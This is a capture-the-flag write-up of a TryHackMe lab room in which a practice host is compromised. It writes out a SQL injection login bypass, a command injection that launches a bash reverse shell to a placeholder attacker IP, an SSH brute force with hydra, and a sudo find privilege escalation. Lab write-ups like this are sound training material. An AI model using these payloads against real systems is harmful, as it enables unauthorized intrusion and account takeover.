---
title: "Operation Promotion"
date: 2026-10-31 18:17:37 +0700
categories: ["TryHackMe", "Challenge"]
tags: ["tryhackme"]
description: "One engagement stands between you and your next title."
toc: true
comments: false
---

![image-1163](/assets/img/obsidian/operation-promotion/image-1163.png)

# Scenario

You are up for promotion at **Hadron Security**. Your senior lead, Mara, has handed you a solo engagement against **RecruitCorp**, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

Start the VM by clicking the `Start Lab Machine` button at the top-right of the task. You can complete the challenge by connecting through VPN or the AttackBox, which contains all the essential tools.

Allow two to three minutes for all services to start.

# Questions

![image-1164](/assets/img/obsidian/operation-promotion/image-1164.png)

---

# Reconnaissance

Of course, first thing is scanning 
`rustscan -a 10.48.142.220 --top -- -sV -sC` 

![image-1165](/assets/img/obsidian/operation-promotion/image-1165.png)

![image-1166](/assets/img/obsidian/operation-promotion/image-1166.png)

Ports 22 (SSH), 80 (HTTP), 139 and 445 (SMB) are opened. So let check the website first.

![image-1167](/assets/img/obsidian/operation-promotion/image-1167.png)

![image-1168](/assets/img/obsidian/operation-promotion/image-1168.png)

Since website doesn't show any feature available. I will use `gobuster` to discover hidden pages.

```bash
gobuster dir -u http://10.48.142.220/ \       
-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
```

![image-1170](/assets/img/obsidian/operation-promotion/image-1170.png)

I found `/admin `and `/config` but for config page. We need authorization to access.

![image-1169](/assets/img/obsidian/operation-promotion/image-1169.png)

For `/admin` page it is sign in pages.

So, maybe let try to use SQL injection. I put `' OR 1=1--` at username and random password.

![image-1171](/assets/img/obsidian/operation-promotion/image-1171.png)

And it worked! On this dashboard page it have feature to lookup a user by ID

![image-1172](/assets/img/obsidian/operation-promotion/image-1172.png)
![image-1174](/assets/img/obsidian/operation-promotion/image-1174.png)

And I try to change id parameter to another number and it show something interesting at ID number 7

![image-1175](/assets/img/obsidian/operation-promotion/image-1175.png)

We discover new path `admin/sysmaint-checks/ping.php`

![image-1176](/assets/img/obsidian/operation-promotion/image-1176.png)

This mean we can ping target via this url.

![image-1177](/assets/img/obsidian/operation-promotion/image-1177.png)

And I think this look like it vuln to **Command Injection**, so I try put `;` after IP addressed and inject command to it and it really worked.

![image-1180](/assets/img/obsidian/operation-promotion/image-1180.png)

Then I will inject this command to perform reverse shell
`bash -c "bash -i >& /dev/tcp/<YOUR_TRYHACKME_VPN_IP>/4444 0>&1"`

and use `nc -lvnp 4444` to wait for connection.

but we have to encode this command to url format first using cyber chef.

![image-1181](/assets/img/obsidian/operation-promotion/image-1181.png)

After connected I found config dir that contain db.conf inside this is very important file.

![image-1182](/assets/img/obsidian/operation-promotion/image-1182.png)

But we are not able to crack the db_pass_hash. After stucking

![image-1168](/assets/img/obsidian/operation-promotion/image-1168.png)

I remember the keyword `spring2026`. Now, we will create our own word lists using this keyword.

![image-1183](/assets/img/obsidian/operation-promotion/image-1183.png)

![image-1184](/assets/img/obsidian/operation-promotion/image-1184.png)


Then use hydra to bruteforce to ssh.

![image-1185](/assets/img/obsidian/operation-promotion/image-1185.png)

and we get the password

![image-1186](/assets/img/obsidian/operation-promotion/image-1186.png)

now connect to jford using this credential and `cat user.txt` to get the flag

![image-1187](/assets/img/obsidian/operation-promotion/image-1187.png)

and we found 

![image-1188](/assets/img/obsidian/operation-promotion/image-1188.png)

then I check with `GTFOBins`

![image-1189](/assets/img/obsidian/operation-promotion/image-1189.png)

use this command 

`sudo /usr/bin/find . -exec /bin/sh \; -quit`

![image-1191](/assets/img/obsidian/operation-promotion/image-1191.png)

and get the flag!

![image-1192](/assets/img/obsidian/operation-promotion/image-1192.png)


*DONE!!!*

---
